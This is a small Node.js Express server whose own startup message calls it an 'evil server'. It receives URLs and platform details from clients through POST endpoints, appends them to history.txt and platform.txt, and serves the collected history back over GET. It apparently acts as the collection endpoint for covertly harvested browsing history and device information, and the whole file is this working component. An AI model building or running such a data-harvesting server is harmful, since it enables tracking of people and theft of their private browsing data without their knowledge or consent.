const express = require('express')
const bodyParser = require("body-parser");
const fs = require('fs');
const app = express()
const port = 3001

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

let recordURL = (req, res) => {
    // console.log(req.body.newURL);
    var newURL = req.body.newURL;
    fs.appendFile('history.txt', newURL+',', function (err) {
        if (err) {
            console.log(err);
            res.send({ result: 'failed!' });
            return;
        }
        console.log('Saved url to file: ' + newURL);
        res.send({ result: 'success!' });
    });
}

let sendFile = (req, res) => {
    console.log(req.body.urlencoded);
    res.sendFile('history.txt', { root: __dirname });
}

let recordPlatform = (req, res) => {
    var info = req.body.platformInfo;
    fs.appendFile('platform.txt', 'Playform Info: ' + info + '\n', function(err) {
        if (err) {
            console.log(err);
            res.send({ result: 'failed!' });
            return;
        }
        console.log('Save platform info!');
        res.send({ result: 'success!' });
    });
}

app.get('/history.txt', sendFile)

app.post('/history/', recordURL)
app.post('/platform/', recordPlatform)

app.listen(port, () => {
    console.log(`my evil server listening on port ${port}!`)
})